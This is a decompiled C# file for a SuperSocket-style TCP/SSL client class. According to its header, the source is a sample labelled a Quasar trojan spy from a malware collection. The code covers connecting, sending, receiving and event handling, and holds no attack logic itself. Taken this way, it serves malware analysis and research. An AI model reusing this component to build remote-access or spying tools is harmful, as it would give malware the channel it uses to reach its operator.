// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.EasyClientBase
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.SuperSocket.ProtoBase;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;

namespace NoiseMe.Drags.App.Models.SuperSocket.ClientEngine
{
  public abstract class EasyClientBase
  {
    private IClientSession m_Session;
    private AutoResetEvent m_ConnectEvent = new AutoResetEvent(false);
    private bool m_Connected;
    private EndPoint m_EndPointToBind;
    private EndPoint m_LocalEndPoint;

    protected IPipelineProcessor PipeLineProcessor { get; set; }

    public int ReceiveBufferSize { get; set; }

    public EndPoint LocalEndPoint
    {
      get => this.m_LocalEndPoint != null ? this.m_LocalEndPoint : this.m_EndPointToBind;
      set => this.m_EndPointToBind = value;
    }

    public bool NoDelay { get; set; }

    public SecurityOption Security { get; set; }

    public IProxyConnector Proxy { get; set; }

    public Socket Socket => this.m_Session?.Socket;

    public bool IsConnected => this.m_Connected;

    private TcpClientSession GetUnderlyingSession()
    {
      SecurityOption security = this.Security;
      if (security == null || security.EnabledSslProtocols == SslProtocols.None)
        return (TcpClientSession) new AsyncTcpSession();
      SslStreamTcpSession underlyingSession = new SslStreamTcpSession();
      underlyingSession.Security = security;
      return (TcpClientSession) underlyingSession;
    }

    public void BeginConnect(EndPoint remoteEndPoint)
    {
      if (this.PipeLineProcessor == null)
        throw new Exception("This client has not been initialized.");
      TcpClientSession underlyingSession = this.GetUnderlyingSession();
      EndPoint endPointToBind = this.m_EndPointToBind;
      if (endPointToBind != null)
        underlyingSession.LocalEndPoint = endPointToBind;
      underlyingSession.NoDelay = this.NoDelay;
      if (this.Proxy != null)
        underlyingSession.Proxy = this.Proxy;
      underlyingSession.Connected += new EventHandler(this.OnSessionConnected);
      underlyingSession.Error += new EventHandler<ErrorEventArgs>(this.OnSessionError);
      underlyingSession.Closed += new EventHandler(this.OnSessionClosed);
      underlyingSession.DataReceived += new EventHandler<DataEventArgs>(this.OnSessionDataReceived);
      if (this.ReceiveBufferSize > 0)
        underlyingSession.ReceiveBufferSize = this.ReceiveBufferSize;
      this.m_Session = (IClientSession) underlyingSession;
      underlyingSession.Connect(remoteEndPoint);
    }

    public void Send(byte[] data) => this.Send(new ArraySegment<byte>(data, 0, data.Length));

    public void Send(ArraySegment<byte> segment)
    {
      IClientSession session = this.m_Session;
      if (!this.m_Connected || session == null)
        throw new Exception("The socket is not connected.");
      session.Send(segment);
    }

    public void Send(List<ArraySegment<byte>> segments)
    {
      IClientSession session = this.m_Session;
      if (!this.m_Connected || session == null)
        throw new Exception("The socket is not connected.");
      session.Send((IList<ArraySegment<byte>>) segments);
    }

    public void Close()
    {
      IClientSession session = this.m_Session;
      if (session == null || !this.m_Connected)
        return;
      session.Close();
    }

    private void OnSessionDataReceived(object sender, DataEventArgs e)
    {
      ProcessResult processResult;
      try
      {
        processResult = this.PipeLineProcessor.Process(new ArraySegment<byte>(e.Data, e.Offset, e.Length));
      }
      catch (Exception ex)
      {
        this.OnError(ex);
        this.m_Session.Close();
        return;
      }
      if (processResult.State == ProcessState.Error)
      {
        this.m_Session.Close();
      }
      else
      {
        if (processResult.State == ProcessState.Cached)
        {
          IClientSession session = this.m_Session;
          if (session != null && session is IBufferSetter bufferSetter)
            bufferSetter.SetBuffer(new ArraySegment<byte>(new byte[session.ReceiveBufferSize]));
        }
        if (processResult.Packages == null || processResult.Packages.Count <= 0)
          return;
        foreach (IPackageInfo package in (IEnumerable<IPackageInfo>) processResult.Packages)
          this.HandlePackage(package);
      }
    }

    private void OnSessionError(object sender, ErrorEventArgs e)
    {
      if (!this.m_Connected)
        this.m_ConnectEvent.Set();
      this.OnError(e);
    }

    private void OnError(Exception e) => this.OnError(new ErrorEventArgs(e));

    private void OnError(ErrorEventArgs args)
    {
      EventHandler<ErrorEventArgs> error = this.Error;
      if (error == null)
        return;
      error((object) this, args);
    }

    public event EventHandler<ErrorEventArgs> Error;

    private void OnSessionClosed(object sender, EventArgs e)
    {
      this.m_Connected = false;
      this.m_LocalEndPoint = (EndPoint) null;
      this.PipeLineProcessor?.Reset();
      EventHandler closed = this.Closed;
      if (closed != null)
        closed((object) this, EventArgs.Empty);
      this.m_ConnectEvent.Set();
    }

    public event EventHandler Closed;

    private void OnSessionConnected(object sender, EventArgs e)
    {
      this.m_Connected = true;
      if (sender is TcpClientSession tcpClientSession)
        this.m_LocalEndPoint = tcpClientSession.LocalEndPoint;
      this.m_ConnectEvent.Set();
      EventHandler connected = this.Connected;
      if (connected == null)
        return;
      connected((object) this, EventArgs.Empty);
    }

    public event EventHandler Connected;

    protected abstract void HandlePackage(IPackageInfo package);
  }
}
